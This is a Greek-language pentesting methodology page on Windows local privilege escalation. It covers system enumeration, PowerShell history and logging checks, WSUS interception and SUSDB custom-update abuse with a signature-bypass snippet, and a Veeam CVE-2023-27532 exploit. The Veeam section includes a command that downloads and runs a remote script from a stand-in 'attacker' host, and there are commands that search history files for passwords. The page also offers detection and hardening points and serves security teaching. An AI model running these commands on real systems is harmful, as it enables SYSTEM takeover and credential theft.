# Κλιμάκωση τοπικών προνομίων στα Windows

{{#include ../../banners/hacktricks-training.md}}

### **Καλύτερο εργαλείο για την αναζήτηση διανυσμάτων κλιμάκωσης τοπικών προνομίων στα Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Αυτή η σελίδα συγκεντρώνει γενική μεθοδολογία κλιμάκωσης προνομίων στα Windows από αρκετούς βασικούς οδηγούς.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Η πρακτική ροή enumeration βασίζεται επίσης σε εργαστήρια και λίστες ελέγχου της κοινότητας.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Το ιστορικό υλικό επιθέσεων περιλαμβάνει την παρουσίαση της DerbyCon για την κλιμάκωση προνομίων στα Windows.<sup>[[5]](#references)</sup>

## Αρχική θεωρία Windows

### Access Tokens

**Αν δεν γνωρίζετε τι είναι τα Windows access tokens, διαβάστε την παρακάτω σελίδα πριν συνεχίσετε:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Δείτε την παρακάτω σελίδα για περισσότερες πληροφορίες σχετικά με τα ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Επίπεδα ακεραιότητας

**Αν δεν γνωρίζετε τι είναι τα επίπεδα ακεραιότητας στα Windows, διαβάστε την παρακάτω σελίδα πριν συνεχίσετε:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Μηχανισμοί ασφαλείας των Windows

Υπάρχουν διάφορα στοιχεία στα Windows που θα μπορούσαν να **σας εμποδίσουν να κάνετε enumeration του συστήματος**, να εκτελέσετε εκτελέσιμα αρχεία ή ακόμη και να **εντοπίσουν τις δραστηριότητές σας**. Θα πρέπει να **διαβάσετε** την παρακάτω **σελίδα** και να κάνετε **enumeration** όλων αυτών των **μηχανισμών** **άμυνας** πριν ξεκινήσετε το enumeration για κλιμάκωση προνομίων:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Η φυσική πρόσβαση μπορεί επίσης να μετατρέψει μια offline επεξεργασία του UEFI NVRAM σε DMA πριν από την εκκίνηση και σε αλυσίδα τροποποίησης μνήμης των Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / αθόρυβη ανύψωση μέσω UIAccess

Μπορεί να γίνει κατάχρηση διεργασιών UIAccess που εκκινούνται μέσω του `RAiLaunchAdminProcess`, ώστε να επιτευχθεί High IL χωρίς προτροπές, όταν παρακάμπτονται οι έλεγχοι ασφαλών διαδρομών του AppInfo. Δείτε εδώ τη σχετική ροή εργασίας παράκαμψης του UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Η διάδοση των καταχωρίσεων μητρώου προσβασιμότητας του Secure Desktop μπορεί να αξιοποιηθεί για αυθαίρετη εγγραφή στο μητρώο ως SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Οι πρόσφατες εκδόσεις των Windows εισήγαγαν επίσης μια διαδρομή LPE μέσω **SMB σε αυθαίρετη θύρα**, όπου γίνεται ανακλώμενος έλεγχος ταυτότητας NTLM από προνομιούχο τοπικό χρήστη μέσω επαναχρησιμοποιημένης σύνδεσης SMB TCP:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Πληροφορίες συστήματος

### Enumeration πληροφοριών έκδοσης

Ελέγξτε αν η έκδοση των Windows έχει γνωστές ευπάθειες (ελέγξτε επίσης τις εγκατεστημένες ενημερώσεις κώδικα).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Version Exploits

Αυτός ο [ιστότοπος](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμος για την αναζήτηση λεπτομερών πληροφοριών σχετικά με ευπάθειες ασφαλείας της Microsoft. Αυτή η βάση δεδομένων περιλαμβάνει περισσότερες από 4.700 ευπάθειες ασφαλείας, δείχνοντας το **τεράστιο attack surface** που παρουσιάζει ένα περιβάλλον Windows.

**Στο σύστημα**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — καταγράφει την έκδοση του OS build, τις εγκατεστημένες ενημερώσεις και πιθανά σχετικά advisories· επαληθεύστε το ακριβές προϊόν και τις νεότερες ενημερώσεις που αντικαθιστούν τις προηγούμενες, πριν θεωρήσετε ότι ένα αποτέλεσμα ισχύει.

Για ένα τοπικό exploit που αφορά συγκεκριμένη έκδοση, ελέγξτε την αρχιτεκτονική της **εκτελούμενης διεργασίας**, καθώς και την αρχιτεκτονική του OS. Στα Windows 64-bit, μια διεργασία 32-bit υπόκειται σε [ανακατεύθυνση συστήματος αρχείων WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): το `%windir%\System32` συνήθως παραπέμπει στον κατάλογο συστήματος 32-bit, ενώ το `%windir%\Sysnative` δίνει σε αυτή τη διεργασία πρόσβαση στον εγγενή κατάλογο συστήματος. Το ψευδώνυμο δεν είναι διαθέσιμο σε διεργασία 64-bit. Το OS build ή η απουσία μιας υποψήφιας ενημέρωσης KB δεν αποδεικνύει ότι είναι δυνατή η εκμετάλλευση· συγκρίνετε το build που εκτελείται, τις εγκατεστημένες ενημερώσεις ή όσες τις αντικαθιστούν, την αρχιτεκτονική της διεργασίας και τις προϋποθέσεις του exploit με το [δελτίο ασφαλείας της Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) για το συγκεκριμένο ζήτημα.

**Τοπικά, με πληροφορίες συστήματος**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repositories με exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Περιβάλλον

Υπάρχουν credentials ή juicy πληροφορίες αποθηκευμένες στις μεταβλητές περιβάλλοντος;

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Ιστορικό PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Αρχεία καταγραφής PowerShell Transcript

Μπορείτε να μάθετε πώς να ενεργοποιήσετε αυτήν τη λειτουργία στο [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` είναι μόνο ένα παράδειγμα. Η [πολιτική καταγραφής PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) συνήθως αποθηκεύει τα αρχεία στον φάκελο Documents κάθε χρήστη, αλλά μια ρύθμιση `OutputDirectory` ή η εντολή `Start-Transcript -OutputDirectory` μπορεί να ανακατευθύνει τα αρχεία σε κοινόχρηστο ή κρυφό φάκελο. Ελέγξτε την ενεργή διαδρομή εξόδου και τα ACL του αρχείου πριν εξετάσετε ένα transcript: μπορεί να περιέχει ορίσματα εντολών και έξοδο, συμπεριλαμβανομένων διαπιστευτηρίων. Ένα transcript στο οποίο έχετε πρόσβαση αποτελεί μόνο ένδειξη, εφόσον το περιεχόμενό του αποκαλύπτει μια αξιοποιήσιμη ταυτότητα με υψηλότερα προνόμια και η συγκεκριμένη ταυτότητα μπορεί να συνδεθεί στο σχετικό περιβάλλον.

### Καταγραφή Module του PowerShell

Καταγράφονται λεπτομέρειες των εκτελέσεων του pipeline του PowerShell, συμπεριλαμβανομένων των εντολών που εκτελέστηκαν, των κλήσεων εντολών και τμημάτων των scripts. Ωστόσο, ενδέχεται να μην καταγράφονται όλες οι λεπτομέρειες της εκτέλεσης και τα αποτελέσματα εξόδου.

Για να το ενεργοποιήσετε, ακολουθήστε τις οδηγίες στην ενότητα "Αρχεία transcript" της τεκμηρίωσης, επιλέγοντας **"Module Logging"** αντί για **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Για να δείτε τα τελευταία 15 συμβάντα από τα logs του PowersShell, μπορείτε να εκτελέσετε:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Καταγράφεται πλήρες αρχείο δραστηριοτήτων και όλου του περιεχομένου κατά την εκτέλεση του script, διασφαλίζοντας ότι κάθε μπλοκ κώδικα τεκμηριώνεται καθώς εκτελείται. Αυτή η διαδικασία διατηρεί ένα ολοκληρωμένο αρχείο ελέγχου κάθε δραστηριότητας, χρήσιμο για την εγκληματολογική ανάλυση και τη διερεύνηση κακόβουλης συμπεριφοράς. Η τεκμηρίωση όλων των δραστηριοτήτων κατά την εκτέλεσή τους παρέχει λεπτομερή εικόνα της διαδικασίας.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Τα συμβάντα καταγραφής για το Script Block βρίσκονται στο Windows Event Viewer, στη διαδρομή: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Για να προβάλετε τα τελευταία 20 συμβάντα, μπορείτε να χρησιμοποιήσετε:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Ρυθμίσεις Internet

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Δίσκοι

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Ένα HTTP WSUS endpoint αποτελεί ένδειξη για περαιτέρω διερεύνηση πιθανής υποκλοπής μεταδεδομένων ενημερώσεων. Η εκμετάλλευση εξαρτάται επίσης από το αν ο client χρησιμοποιεί αυτόν τον WSUS server, αν κάποιος attacker μπορεί να υποκλέψει ή να ελέγξει την κίνησή του, καθώς και από τις πολιτικές εμπιστοσύνης ενημερώσεων και εγκατάστασης του client. Το URL από μόνο του δεν συνεπάγεται εκτέλεση κώδικα. [Η Microsoft συνιστά TLS για τα μεταδεδομένα WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Ξεκινάτε ελέγχοντας αν το δίκτυο χρησιμοποιεί ενημέρωση WSUS χωρίς SSL, εκτελώντας την παρακάτω εντολή στο cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ή τα ακόλουθα σε PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Αν λάβετε μια απάντηση όπως μία από τις παρακάτω:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Και αν τα `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ή `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ισούνται με `1`.

Όταν το `UseWUServer` είναι `1`, το Windows Update χρησιμοποιεί την καθορισμένη υπηρεσία intranet. Αυτό επιβεβαιώνει μια προϋπόθεση για την οδό υποκλοπής HTTP, αλλά δεν αποδεικνύει ότι είναι δυνατή η υποκλοπή, η αποδοχή κακόβουλων ενημερώσεων ή η εγκατάστασή τους με αυξημένα δικαιώματα. Όταν είναι `0`, αυτή η συγκεκριμένη ρυθμισμένη διεύθυνση WSUS δεν επιλέγεται από την εν λόγω πολιτική.

Για να εκμεταλλευτείτε αυτές τις ευπάθειες, μπορείτε να χρησιμοποιήσετε εργαλεία όπως τα [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — πρόκειται για weaponized MiTM exploit scripts που εισάγουν «ψεύτικες» ενημερώσεις σε κίνηση WSUS χωρίς SSL.

Διαβάστε την έρευνα εδώ:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Διαβάστε την πλήρη αναφορά εδώ**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Βασικά, αυτό είναι το ελάττωμα που εκμεταλλεύεται αυτό το bug:

> Αν έχουμε τη δυνατότητα να τροποποιήσουμε τον proxy του τοπικού χρήστη μας και το Windows Update χρησιμοποιεί τον proxy που έχει ρυθμιστεί στις ρυθμίσεις του Internet Explorer, τότε μπορούμε να εκτελέσουμε το [PyWSUS](https://github.com/GoSecure/pywsus) τοπικά, να υποκλέψουμε τη δική μας κίνηση και να εκτελέσουμε κώδικα με αυξημένα δικαιώματα στο σύστημά μας.
>
> Επιπλέον, καθώς η υπηρεσία WSUS χρησιμοποιεί τις ρυθμίσεις του τρέχοντος χρήστη, χρησιμοποιεί επίσης και το certificate store του. Αν δημιουργήσουμε ένα self-signed certificate για το hostname του WSUS και το προσθέσουμε στο certificate store του τρέχοντος χρήστη, θα μπορούμε να υποκλέψουμε τόσο HTTP όσο και HTTPS κίνηση WSUS. Το WSUS δεν χρησιμοποιεί μηχανισμούς τύπου HSTS για να υλοποιήσει επικύρωση τύπου trust-on-first-use του certificate. Αν το certificate που παρουσιάζεται είναι έμπιστο για τον χρήστη και έχει το σωστό hostname, η υπηρεσία θα το αποδεχτεί.

Μπορείτε να εκμεταλλευτείτε αυτή την ευπάθεια χρησιμοποιώντας το εργαλείο [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (μόλις γίνει διαθέσιμο).

### Ενημερώσεις WSUS υπό τον έλεγχο διαχειριστή

Υπάρχει ξεχωριστή διαδρομή όταν η τρέχουσα ταυτότητα μπορεί να **δημοσιεύει και να εγκρίνει** ενημερώσεις σε έναν διακομιστή WSUS. Ελέγξτε την πραγματική συμμετοχή στην ομάδα `WSUS Administrators` του διακομιστή και τυχόν εκχωρημένα δικαιώματα WSUS και, στη συνέχεια, εντοπίστε την ομάδα υπολογιστών-πελατών που θα λάβει μια εγκεκριμένη ενημέρωση. Η [Microsoft απαιτεί δικαιώματα WSUS Administrator για την έγκριση ενημερώσεων](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) και [τεκμηριώνει τη σχέση εμπιστοσύνης για τη δημοσίευση](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): οι clients πρέπει να εμπιστεύονται το certificate υπογραφής που χρησιμοποιείται για περιεχόμενο που δημοσιεύεται τοπικά. Προτού θεωρήσετε ότι πρόκειται για διαδρομή κλιμάκωσης δικαιωμάτων, επιβεβαιώστε ότι η υποψήφια ενημέρωση είναι υπογεγραμμένη και γίνεται αποδεκτή, εφαρμόζεται στον στόχο και εγκαθίσταται σε περιβάλλον με υψηλότερα δικαιώματα. Μια τιμή HTTP `WUServer` ή ένα όνομα ομάδας από μόνα τους δεν τεκμηριώνουν αυτές τις προϋποθέσεις.

### Κατάχρηση προσαρμοσμένων ενημερώσεων SUSDB: unsigned payloads μέσω `.txt`/`.esd`

Πρόκειται για διαφορετική παραβίαση ορίου εμπιστοσύνης από την υποκλοπή σύνδεσης HTTP WSUS: η προϋπόθεση είναι να υπάρχει επαρκής πρόσβαση στις αποθηκευμένες διαδικασίες της **βάσης δεδομένων WSUS (`SUSDB`)**, ώστε να είναι δυνατή η δημοσίευση και έγκριση μιας προσαρμοσμένης ενημέρωσης. Μια πρακτική διαδρομή εισόδου είναι η αναμετάδοση ενός λογαριασμού υπολογιστή WSUS upstream σε ξεχωριστό διακομιστή MSSQL που φιλοξενεί την `SUSDB`· οι ακριβείς προϋποθέσεις εξαρτώνται από την ανάπτυξη, γι' αυτό πρώτα απαριθμήστε τα δικαιώματα `EXECUTE` αντί να θεωρήσετε δεδομένα τα δικαιώματα SQL administrator.<sup>[[38]](#references)[[39]](#references)</sup>

Για την ξεχωριστή διαδρομή επίθεσης που αναμεταδίδει την αυθεντικοποίηση WSUS client από HTTP/8530 σε LDAP, SMB ή AD CS, δείτε [Κατάχρηση HTTP WSUS για NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Δημιουργία, στόχευση και έγκριση της ενημέρωσης

Η ροή εργασίας προσαρμοσμένων ενημερώσεων χρησιμοποιεί νόμιμες διαδικασίες WSUS ως περιορισμένο API δημοσίευσης. Οι σημαντικές μεταβάσεις κατάστασης είναι οι εξής:<sup>[[38]](#references)</sup>

| Στάδιο | Σχετικές αποθηκευμένες διαδικασίες |
| --- | --- |
| Εισαγωγή μεταδεδομένων ενημέρωσης | `spImportUpdate` |
| Αποθήκευση των XML τμημάτων προαπαιτούμενων, τοπικοποιημένων και εκτεταμένων δεδομένων | `spSaveXMLFragment` |
| Συσχέτιση του digest περιεχομένου με URL που ελέγχεται από τον επιτιθέμενο | `spSetBatchURL` |
| Απαρίθμηση/δημιουργία ομάδας υπολογιστών και προσθήκη του client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Έγκριση της εγκατάστασης για αυτή την ομάδα | `spDeployUpdate` με `@actionID = 0` και `@isAssigned = 1` |

Το όνομα αρχείου, τα digests, το μέγεθος και ο handler `CommandLineInstallation` πρέπει να συμφωνούν στα εισαγόμενα μεταδεδομένα/τμήματα. Αφού οριστούν το URL του περιεχομένου και η ομάδα-στόχος, η τελική έγκριση έχει την παρακάτω μορφή· χρησιμοποιήστε νέα αναγνωριστικά ενημέρωσης, ομάδας και ανάπτυξης αντί να επαναχρησιμοποιήσετε τα GUID των παραδειγμάτων.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

Το WSUS συνήθως απορρίπτει αυθαίρετο μη υπογεγραμμένο εκτελέσιμο περιεχόμενο. Ωστόσο, στο `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, η διαδρομή .NET `VerifyFile` ορίζει τη σημαία ελέγχου πιστοποιητικού σε false όταν το παρεχόμενο όνομα αρχείου τελειώνει σε `.txt` ή `.esd`. Έτσι, παραλείπεται η `CheckCertificateSignature` χωρίς να επιβεβαιωθεί πρώτα ότι τα bytes είναι κείμενο ή νόμιμη εικόνα ESD. Επομένως, ένα PE χωρίς τροποποιήσεις, με όνομα όπως `payload.exe.txt`, μπορεί να περάσει την επαλήθευση περιεχομένου και στη συνέχεια να εκκινηθεί από τον χειριστή εγκατάστασης της γραμμής εντολών της ενημέρωσης. Πρόκειται για σφάλμα σύγχυσης τύπου (type-confusion) στην πολιτική, όχι για πλαστογράφηση υπογραφής.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging και αυτοματοποίηση συμβατά με BITS

Η κλήση του `spDeployUpdate` κάνει το WSUS να ανακτήσει το καταχωρισμένο περιεχόμενο. Η προέλευση πρέπει να πληροί τις απαιτήσεις HTTP του BITS: δεν αρκεί να είναι προσβάσιμο ένα URL, επειδή η μεταφορά χρησιμοποιεί αρχική ροή `HEAD`/`GET` και αιτήματα byte-range. Ένας server χωρίς υποστήριξη Range προκαλεί συμβάν συγχρονισμού WSUS `EventId=364`, το οποίο αναφέρει ότι το BITS απαιτεί την κεφαλίδα πρωτοκόλλου Range.<sup>[[39]](#references)</sup>

Το ερευνητικό PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) δημιουργεί το SQL που απαιτείται για την αλυσίδα import/fragment/URL/group/deployment, περιλαμβάνει έναν τροποποιημένο client MSSQL για την εκτέλεσή του και παρέχει το `BitsWebServer.py` για staging περιεχομένου. Μια ελάχιστη εντολή για εξουσιοδοτημένο εργαστήριο είναι η εξής:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Μη επιτηρούμενη εκτέλεση και persistence μέσω επανάληψης

Η αλληλεπίδραση από την πλευρά του client εξαρτάται από την πολιτική. Η επιλογή `4 - Auto download and schedule install` στη διαδρομή `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` κάνει τη λήψη και εγκατάσταση μιας εγκεκριμένης ενημέρωσης στο καθορισμένο πρόγραμμα, χωρίς να χρειάζεται να την επιλέξει χειροκίνητα ο χρήστης. Σε δοκιμές, ένα payload του οποίου η ενημέρωση παρέμενε σε αποτυχημένη/ατελή κατάσταση προσφερόταν ξανά αμέσως μόλις τερματιζόταν η διεργασία callback. Έτσι, η συμπεριφορά επανάληψης μπορεί να οδηγήσει σε recurring execution persistence· είναι θορυβώδης, επειδή ο client εμφανίζει κατάσταση αποτυχίας ενημέρωσης.<sup>[[39]](#references)</sup>

#### Σημεία ελέγχου για εντοπισμό και hardening

Χρήσιμα σημεία ελέγχου από την πλευρά του server και του client σε αυτή την αλυσίδα είναι τα εξής:<sup>[[39]](#references)</sup>

- Ελέγξτε την εκτέλεση των `spCreateTargetGroup`, `spSetBatchURL` και `spDeployUpdate` στη `SUSDB`. Διερευνήστε νέες ομάδες στόχευσης, εξωτερικές προελεύσεις περιεχομένου, payload ενημερώσεων `.txt`/`.esd` και deployments από μη αναμενόμενους principals (ιδίως λογαριασμούς που δεν είναι λογαριασμοί υπολογιστών).
- Εξετάστε το `C:\Program Files\Update Services\LogFiles` για `ContentSyncAgent`, `FileVerified`, το ανορθόγραφο `FileVerficationFailed` και `EventId=364`. Συσχετίστε την επαλήθευση με την επέκταση του payload και το content magic, αντί να εμπιστεύεστε την κατάληξη.
- Αναζητήστε επανειλημμένες αποτυχίες/επαναλήψεις εγκατάστασης του Windows Update, καθώς και εκτέλεση PE ή μη αναμενόμενη δραστηριότητα child/network από περιεχόμενο με ονόματα `.txt` ή `.esd`.
- Όπου υποστηρίζεται, απαιτήστε Extended Protection for Authentication στην υπηρεσία βάσης δεδομένων και περιορίστε την πρόσβαση στο δίκτυο της βάσης δεδομένων στον WSUS server και σε εξουσιοδοτημένα συστήματα διαχείρισης. Περιορίστε στο ελάχιστο και ελέγχετε τα δικαιώματα `EXECUTE` στις διαδικασίες custom-update.

## Εργαλεία αυτόματης ενημέρωσης τρίτων και Agent IPC (local privesc)

Πολλοί εταιρικοί agents εκθέτουν μια επιφάνεια IPC στο localhost και ένα κανάλι προνομιακής ενημέρωσης. Αν η εγγραφή μπορεί να εξαναγκαστεί να συνδεθεί με server του attacker και το updater εμπιστεύεται μια κακόβουλη root CA ή χρησιμοποιεί αδύναμους ελέγχους υπογραφής, ένας τοπικός χρήστης μπορεί να παραδώσει ένα κακόβουλο MSI, το οποίο εγκαθιστά η υπηρεσία SYSTEM. Δείτε εδώ μια γενικευμένη τεχνική (βασισμένη στην αλυσίδα Netskope stAgentSvc – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM μέσω TCP 9401)

Τα Veeam Backup & Replication και Cloud Connect χρησιμοποιούν μια βασική υπηρεσία backup στην **TCP/9401 από προεπιλογή**. Η [συμβουλευτική ανακοίνωση της Veeam](https://www.veeam.com/kb4424) περιγράφει μη αυθεντικοποιημένη αποκάλυψη διαπιστευτηρίων κρυπτογραφημένης βάσης δεδομένων ρυθμίσεων εντός της περιμέτρου δικτύου backup· ξεχωριστό δημόσιο PoC επιδεικνύει μια διαδρομή εκτέλεσης εντολών ως **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Η υπηρεσία ενδέχεται να κάνει bind σε διευθύνσεις πέρα από το localhost, οπότε ελέγξτε την πραγματική διεύθυνση και το PID της.

- **Recon**: επιβεβαιώστε ότι η TCP/9401 ανήκει στο `Veeam.Backup.Service.exe` και, στη συνέχεια, ελέγξτε το εγκατεστημένο προϊόν και τα μεταδεδομένα ενημερώσεων. Οι εντολές `netstat -ano | findstr 9401` και `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` είναι ενδείξεις, όχι πλήρης έλεγχος ενημερώσεων.
- **Ελάχιστες διορθωμένες εκδόσεις**: Η Veeam αναφέρει τις **11a build 11.0.1.1261 P20230227** και **12 build 12.0.0.1420 P20230223** ως τις πρώτες διορθωμένες εκδόσεις· επηρεάζονται οι παλαιότερες εκδόσεις. Μια τετραμερής έκδοση αρχείου από μόνη της δεν μπορεί να διακρίνει μια μη διορθωμένη βασική έκδοση από μεταγενέστερη ενημέρωση με τους ίδιους αριθμούς build. Επαληθεύστε το αναγνωριστικό ενημέρωσης στο [ιστορικό build του προμηθευτή](https://www.veeam.com/kb2680) πριν θεωρήσετε διορθωμένο ένα build στο όριο.
- **Exploit**: τοποθετήστε ένα PoC, όπως το `VeeamHax.exe`, μαζί με τα απαιτούμενα Veeam DLLs στον ίδιο κατάλογο και, στη συνέχεια, ενεργοποιήστε ένα SYSTEM payload μέσω του τοπικού socket:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Η αναφερόμενη PoC αποδεικνύει εκτέλεση εντολών ως SYSTEM όταν ισχύουν οι πρόσθετες προϋποθέσεις της· η συμβουλή του κατασκευαστή περιγράφει το ζήτημα αποκάλυψης διαπιστευτηρίων.
## KrbRelayUp

